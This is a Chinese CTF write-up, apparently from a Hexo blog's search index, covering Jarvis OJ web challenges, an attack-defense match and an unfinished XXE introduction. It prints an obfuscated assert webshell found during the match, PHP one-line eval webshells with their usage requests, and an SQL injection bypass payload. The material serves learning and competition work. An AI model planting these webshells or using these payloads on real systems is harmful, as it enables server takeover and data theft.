<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[CTF-writeup]]></title>
      <url>/2019/07/08/CTF-writeup/</url>
      <content type="html"><![CDATA[<h1 id="CTF-writeup"><a href="#CTF-writeup" class="headerlink" title="CTF writeup"></a>CTF writeup</h1><p>都是菜鸡总结的一些常识, dalao们请绕路(发抖)<br>但是也欢迎大佬们来纠正错误<br>菜鸡不胜感激</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="localhost-resolved"><a href="#localhost-resolved" class="headerlink" title="localhost(resolved)"></a><a href="http://web.jarvisoj.com:32774/" target="_blank" rel="noopener">localhost</a>(resolved)</h3><p>题目中只有一行 <strong>localhost access only!!</strong><br><a href="https://link.jianshu.com/?t=http://www.111cn.net/phper/php-cy/59523.htm" target="_blank" rel="noopener">PHP获取用户IP地址</a><br>所以需要伪造自己的IP地址<br>一个比较简单的方法是在HTTP的请求头中添加参数:<code>X-Forwarded-For : 需要伪造的IP</code><br>可以使用burp suite抓包或PostMan来实现</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/X-Forwarded-For.png" alt title class>
                <p></p>
            </figure>
<p>类似的, 可以伪造<code>Referer</code><br><code>Referer</code>表明了用户是从哪个页面跳转来的.<br>例如<br><code>Referer: https://www.google.com</code></p>
<h3 id="admin-resolved"><a href="#admin-resolved" class="headerlink" title="admin(resolved)"></a><a href="http://web.jarvisoj.com:32792/" target="_blank" rel="noopener">admin</a>(resolved)</h3><p>进入网页只有一个hello world<br>查看网页代码,没有线索<br>尝试robots.txt,网页跳转,但是出现了一个假flag<br>burp suite抓包, 修改参数admin = 1,follow后出现真的flag</p>
<h3 id="login-working"><a href="#login-working" class="headerlink" title="login(working)"></a><a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">login</a>(working)</h3><p>进入题目只有一个登陆框，<br>右键源码，发现密码校验不在本地，<br>使用BurpSuite在后台密码爆破，<br>同时尝试使用 sql 注入<br>输入 <code>1&#39;or&#39;1&#39;or&#39;1</code>,<br>得到一个奇怪的响应,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /opt/lampp/htdocs/index.php on line 14</span><br><span class="line">Wrong Password.</span><br></pre></td></tr></table></figure>

<p>正当百思不得其解时,<br>查看下爆破时的 response 包,竟然有提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: &quot;select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</span><br></pre></td></tr></table></figure>

<p>关于md5(string,raw)函数:</p>
<ul>
<li>string必需, 规定要计算的字符串</li>
<li>raw可选, 规定十六进制或二进制输出格式(TRUE或FALSE)</li>
</ul>
<p>2019/7/4日 补充:<br>原来hint里已经说的很清楚了, 就是先把我们的参数md5加密后再执行查询.<br>如果我们想构造payload, 需要使 md5($pass,true) 的结果中出现 <code>&#39;or&#39;</code> , 才可能绕过.<br>针对这个问题, 已经有了现成的payload – <code>ffifdyop</code><br>这是因为 :<br>MD5(‘ffifdyop’) =&gt; <code>276f722736c95d99e921722cf9ed621c</code>  #md5加密<br><code>276f722736c95d99e921722cf9ed621c</code> =&gt;  ‘or’6&lt;乱码&gt;     #转为字符串</p>
<h3 id="神盾局的秘密-working"><a href="#神盾局的秘密-working" class="headerlink" title="神盾局的秘密(working)"></a><a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">神盾局的秘密</a>(working)</h3><p>进入题目, 在开发者工具中发现有代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>传给img的参数是被base64加密过了,<br>所以如果我们想利用这个参数搞事,也必须先用base64加密</p>
<p>首先对 <code>index.php</code> 加密得到 <code>aW5kZXgucGhw</code><br>将它作为参数传给URL:<br><code>http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw</code><br>返回的页面中有代码 :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php </span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">	$x = <span class="keyword">new</span> Shield();</span><br><span class="line">	<span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">		$x = unserialize($g);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">echo</span> $x---&gt;</span><br></pre></td></tr></table></figure>

<p>既然从url中看出有个文件名字叫<code>showimg.php</code>, 以同样的方法将其作为参数,访问url:<code>http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=</code><br>也有代码 :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php</span><br><span class="line">	$f = $_GET[<span class="string">'img'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">		$f = base64_decode($f);</span><br><span class="line">		<span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></span><br><span class="line">		&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">			readfile($f);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?--&gt;</span><br></pre></td></tr></table></figure>

<p>然而暂时还不懂代码的逻辑, 回来再说</p>
<h3 id="IN-A-MESS-working"><a href="#IN-A-MESS-working" class="headerlink" title="IN A MESS(working)"></a><a href="http://web.jarvisoj.com:32780/index.phps" target="_blank" rel="noopener">IN A MESS</a>(working)</h3><p>进入题目只有一句 <code>work harder!harder!harder!</code><br>观察url有个参数id,不管怎样,<br>先后台爆着再说.<br>然而并没有什么卵用.<br>看response包里,有个index.phps <em>一开始我根本没看出来和index.php不一样</em> :/<br>访问,有如下代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">'Location: index.php?id=1'</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造payload比较复杂, 回再说吧</p>
<p><a href="https://www.cnblogs.com/baifan2618/p/7815090.html" target="_blank" rel="noopener">参考</a></p>
<h3 id="PORT51-resolved"><a href="#PORT51-resolved" class="headerlink" title="PORT51(resolved)"></a><a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">PORT51</a>(resolved)</h3><p>根据题目, 应该是需要以指定的51端口访问.<br>在本地cmd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --local-port 51 http://web.jarvisoj.com:32770/</span><br></pre></td></tr></table></figure>

<p>并没有什么卵用, 得到的响应和在浏览器上没区别,<br>但是使用服务器, 输入同样的命令可以成功, 暂时存疑<br>反正,<br>flag 拿到了对吧 :(</p>
<h3 id="TSCTF-resolved"><a href="#TSCTF-resolved" class="headerlink" title="TSCTF(resolved)"></a>TSCTF(resolved)</h3><figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/TSCTF.jpeg" alt title class>
                <p></p>
            </figure>

<p>这应该算是我第一次参见比较正式的CTF线下赛吧</p>
<p>能得奖基本就是靠抱大腿</p>
<p>没什么想多说的</p>
<p>只希望明年这天</p>
<p>我是D.I.E的主力</p>
<h4 id="流量监听"><a href="#流量监听" class="headerlink" title="流量监听"></a>流量监听</h4><p>打算在比赛时可以通过监听工具,抓取自家服务器的流量,<br>就算题目没有头绪, 还可以分析一波别人的 payload.</p>
<p><strong>tshark</strong><br>需要先自行安装一下.<br><strong>基本每个命令都需要root权限<code>sudo</code></strong></p>
<ul>
<li>显示可用网卡 <code>tshark -D</code></li>
<li>抓包  使用命令 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tshark  -c [数字]  -w [文件名.pcap] -f [捕获过滤器]</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">+ -c 表示抓多少包后停止</span><br><span class="line">+ -w 把抓包结果输入到文件中, 无需提前创建, 若目录下没有, 自动创建</span><br><span class="line">+ -f 设置捕获过滤器, 我们此处主要针对http的数据包, 所以参数设定为 &quot;port 80&quot;</span><br><span class="line"></span><br><span class="line">但是根据我的试验, 凡是使用tshark后产生的文件权限都十分敏感, 没法用finalshell 直接下载, 为了方便起见, 再补充使用 tcpdump 的方法</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>tcpdump -s  [数字]  -w [文件.pcap] port [端口数]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">+ -s 表示一个包截断的长度, 0表示不截断, 完整的保存下来</span><br><span class="line">+ -w 输入到文件</span><br><span class="line">+ port 监听的端口</span><br><span class="line"></span><br><span class="line">**使用 tcpdump 同样需要sudo**</span><br><span class="line">然而这场比赛没有root权限, 自然也就没法用sudo, 我, , ,</span><br><span class="line"></span><br><span class="line">#### 自动提交 flag 的 python 脚本</span><br><span class="line"></span><br><span class="line">```py</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">def submit(flag, token):                           # 定义函数 submit</span><br><span class="line">	url = &quot;wangzhi&quot;                            # 需要设置的参数  url</span><br><span class="line">	pos = &#123;                                    # 字典，python的一种可变容器模型</span><br><span class="line">	    &quot;flag&quot;:flag,</span><br><span class="line">	    &quot;token&quot;:token</span><br><span class="line">	&#125;                                          # 所以 pos[&quot;flag&quot;] = flag</span><br><span class="line">	print &quot;[+] Submiting flag : [%s]&quot; % (pos)  # 格式化输出 pos</span><br><span class="line">	response = requests.post(url,data=pos)     # response 接收 request.post()返回的对象(?),其有许多数据域</span><br><span class="line">	content = response.content                 # content 接收 response的数据域content, 二进制数据</span><br><span class="line">	print &quot;[+] Content : %s &quot; % (content)      # 格式化输出content</span><br><span class="line">	if failed in content:                      # 若成功提交, 返回True,反之返回False</span><br><span class="line">		print &quot;[-]failed&quot;</span><br><span class="line">		return False</span><br><span class="line">	else:</span><br><span class="line">		print &quot;[+] Success!&quot;            </span><br><span class="line">		return True</span><br></pre></td></tr></table></figure>

<p>然而目前我的python环境还有点问题, 暂时没法正常运行<br>装了python3, 又装python2<br>装python一时爽,<br>一直装一直爽 😭</p>
<h4 id="第一个漏洞"><a href="#第一个漏洞" class="headerlink" title="第一个漏洞"></a>第一个漏洞</h4><p>开局登陆进主机后, 迅速使用下载整个网络目录到本地<br>D盾扫描出一个高危文件!<code>.202cb962ac59075b964b07152d234b70.ini.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_=<span class="string">'s'</span>.<span class="string">'s'</span>.<span class="comment">/*-/*-*/</span><span class="string">'e'</span>.<span class="comment">/*-/*-*/</span><span class="string">'r'</span>;</span><br><span class="line">@$_=<span class="comment">/*-/*-*/</span><span class="string">'a'</span>.<span class="comment">/*-/*-*/</span>$_.<span class="comment">/*-/*-*/</span><span class="string">'t'</span>;</span><br><span class="line">@$_<span class="comment">/*-/*-*/</span>($<span class="comment">/*-/*-*/</span>&#123;<span class="string">'_P'</span>.<span class="comment">/*-/*-*/</span><span class="string">'OS'</span>.<span class="comment">/*-/*-*/</span><span class="string">'T'</span>&#125;</span><br><span class="line">[<span class="comment">/*-/*-*/</span><span class="number">0</span><span class="comment">/*-/*-*/</span>+<span class="comment">/*-/*-*/</span><span class="number">3</span><span class="comment">/*-/*-*/</span>+<span class="comment">/*-/*-*/</span><span class="number">3</span><span class="comment">/*-/*-*/</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个文件当时没有看懂，但是现在经过学长的指点有点清晰了<br>其实代码中有着大量的障眼法<br>首先是大量的注释，把它们去掉后</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_=<span class="string">'s'</span>.<span class="string">'s'</span>.<span class="string">'e'</span>.<span class="string">'r'</span>;</span><br><span class="line">@$_=<span class="string">'a'</span>.$_.<span class="string">'t'</span>;</span><br><span class="line">@$_($&#123;<span class="string">'_P'</span>.<span class="string">'OS'</span>.<span class="string">'T'</span>&#125;</span><br><span class="line">[<span class="number">0</span>+<span class="number">3</span>+<span class="number">3</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其实这里看出仍有很多拼接运算在阻碍我们分析,<br>我们直接写出拼接后的结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_=<span class="string">'assert'</span>;</span><br><span class="line">@$_($&#123;<span class="string">'_POST'</span>&#125;[<span class="number">6</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们看到,这两行代码中都有变量<code>$_</code>,<br>起初我不知道这是什么意思, 其实就是相当于文本的替换<br>因为<code>$_</code>存放的是字符串, 所以php的解释器在分析时也仅仅是把内容原封不动的放在这里<br>那么这段代码就是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @assert($_POST[<span class="number">6</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>而一句话木马<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code><br>其中assert()和eval()的效果类似<br>所以这个文件里就是暗藏一句话木马!</p>
<h4 id="一句话木马的原理"><a href="#一句话木马的原理" class="headerlink" title="一句话木马的原理"></a>一句话木马的原理</h4><p>之前使用一句话木马也有好几次了,<br>但是基本都是用菜刀直连, 却对它的原理不甚了解.<br>借这个机会赶紧把php的一些细节上的东西搞清楚.</p>
<p>常见的一句话木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>eval()函数</strong> : 会把里面的变量当成php代码来执行.<br>如果说 <code>$_post[&#39;cmd&#39;]</code> 此时的值是<code>print &#39;hello world&#39;</code>, 那么它运行起来的回显就是<code>hello world</code><br>如果<code>%_post[&#39;cmd&#39;]</code>的值是<code>system(&#39;cat flag&#39;)</code>, 那么在服务器端就会执行<code>cat flag</code>命令并在浏览器上回显<br>也就是说, 连接上了一句话, 你就可以用这个函数随便<del>做爱做的事情</del>搞事, 前提是有足够的权限</p>
</li>
<li><p><strong>$_post[‘cmd’]</strong> : 一句话的目的是执行我们的命令, 那么它就需要一个变量来接收我们传来的数据, $_post[‘cmd’]就是干这个的, 它会从http的POST数据包中接收一个名为<code>cmd</code>的参数.<br>问题是, 如果这个一句话木马是别人植入的, 那我就不知道这个参数的名字是什么, 也就无法正确的<del>做爱做的事</del>传参. 所以这里的参数名又起到了密码的作用, 让我们的一句话只为自己所用.</p>
</li>
<li><p><strong>@</strong> 符号的作用是 : 如果代码错误执行, 不把报错信息显示出来.<br>为什么要这样做呢? 因为假如我们不传参数执行代码, 那么服务器就会善意的报错:</p>
<blockquote>
<p>Notice，你的cmd变量没有定义。</p>
</blockquote>
<p>于是密码就被服务器暴露了.<br>@ 就可以避免这种尴尬的场面</p>
</li>
</ul>
<p>其实我觉得上来就用菜刀控制一句话木马并不好,<br>因为这个工具把底层的东西都封装好了.<br>我深信, 要想真正理解某样东西, 越接近底层, 越有助于深入.<br>所以要先学会<strong>使用浏览器连接一句话木马</strong></p>
<p>在比赛的时候, 见到学长在url上设置payload,<br>所以我想设置url的payload连接一句话,<br><code>http://whoisyourdaddy.cf/test.php?cmd=system(&#39;ls&#39;);</code><br>按照我们上面的分析, php代码就会执行<code>system(&#39;ls&#39;);</code>, 回显出目录下的文件.<br>(一定不要忘记后面的 <code>;</code>血的教训😭)<br><font size="5"><strong>然而 :</strong></font></p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/kongkongde.png" alt title class>
                <p></p>
            </figure>

<p>这是因为, <strong>$_post根本不接收用GET方法传来的参数!</strong><br>$_post只接收使用POST方法接受的表单数据.</p>
<p>简单起见, 我们先用url作为payload, 那么, 需要把代码改成</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问一下.</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/ls.png" alt title class>
                <p></p>
            </figure>
<p>成功了.</p>
<p>同理, 要想使用POST方法传递数据, 可以用</p>
<ul>
<li>Chrome 的插件 Hackbar</li>
<li>Burp Suite change method</li>
<li>Post man 生成 payload</li>
</ul>
<p>我成功的使用Burp 的 change method 功能和 PostMan 实现了.<br>postman的使用有些坑要注意, 如图</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/postman.png" alt title class>
                <p></p>
            </figure>
<h4 id="POST和GET数据包的对比"><a href="#POST和GET数据包的对比" class="headerlink" title="POST和GET数据包的对比"></a>POST和GET数据包的对比</h4><p>GET:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /test.php?cmd=system(%27ls%27); HTTP/1.1</span><br><span class="line">Host: whoisyourdaddy.cf</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>POST:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /test.php HTTP/1.1</span><br><span class="line">Host: whoisyourdaddy.cf</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 21</span><br><span class="line"></span><br><span class="line">cmd=system(%27ls%27);</span><br></pre></td></tr></table></figure>

<p>一句话木马先分析到这里.</p>
<h4 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h4><p>由于线下赛的服务器在比赛结束后就关闭了, 很多题目也不方便复现.<br>主要说一下思路就好了</p>
<ul>
<li>web1<br>前面的一句话木马已经分析过了,<br>其修补漏洞的方法也很简单 : 直接删除木马文件, 一了百了.<br>除了上面的一句话漏洞, 还有针对finecms的任意文件读取漏洞<br>我认为这个漏洞的根源是url过滤不够严格<br>题目一开始的代码只替换<code>../</code>为<code></code>,<br>修补方式是, 循环替换<code>../</code>, 让不法分子无机可乘<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/welcome.png" alt="web1的logo,真的很皮" title class>
                <p>web1的logo,真的很皮</p>
            </figure>
<del>这段代码, 我修的 (叉腰)</del></li>
<li>web2<br>在题目给的站的某处, 可以上传图片,<br>但是对文件格式的检测却很宽松.<br>保存着上传图片的地方也没有限制访问.<br>直接图片马走起安排.<br>可以参考 <a href="http://whoisyourdaddy.cf/渗透测试&上传漏洞.html" target="_blank" rel="noopener">渗透测试&amp;上传漏洞</a></li>
<li>至于pwn1和pwn2 , , , 打扰了打扰了</li>
</ul>
<h3 id="api调用-resolved"><a href="#api调用-resolved" class="headerlink" title="api调用(resolved)"></a><a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">api调用</a>(resolved)</h3><p>这道题利用的是xxe漏洞<br>那么<a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">什么是xxe漏洞呢?</a></p>
<blockquote>
<p>简单来说，XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p>
</blockquote>
<p><font size="2">咳, 这说的一点也不简单啊(小声bb) </font><br>对着其中几个陌生的名词来学习下:</p>
<ul>
<li><p>XML : </p>
<blockquote>
<p>可扩展标记语言，标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言。</p>
</blockquote>
<p>  根据我自己的理解, 应该就是一种可以<strong>方便计算机理解</strong>的, 使<strong>内部数据具有清晰逻辑结构</strong>的一种<strong>标记语言</strong><br>  示例代码如下: </p>
  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /vulnerable HTTP/1.1</span><br><span class="line">Host: www.test.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Referer: https://test.com/test.html</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 294</span><br><span class="line">Cookie: mycookie=cookies;</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">"test101"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>XML is the best!<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>语法上:<br>这段代码中定义了一个根元素–<code>catalog</code>, <code>id</code>是<code>core</code>的一个属性, <code>author</code>和<code>title</code>则是<code>core</code>的子元素, <code>core</code>是<code>catalog</code>的子元素</p>
</li>
<li><p>功能上:<br>注意看代码的开头部分, 是POST方法的<strong>Header</strong>. 所以其实这段代码本质上仍然是一个<strong>POST方法的http数据包</strong>, 本质上和我们之前分析的post|get数据包没区别. 其作用无非是向服务器提交一份数据而已. 至于怎么处理, 那就看服务端的程序是怎样的了</p>
<br>  </li>
</ul>
</li>
<li><p><strong>允许引用外部实体</strong> :<br>  不过, 如果是下面的这段代码, 就会成为所谓的恶意payload, 如下:</p>
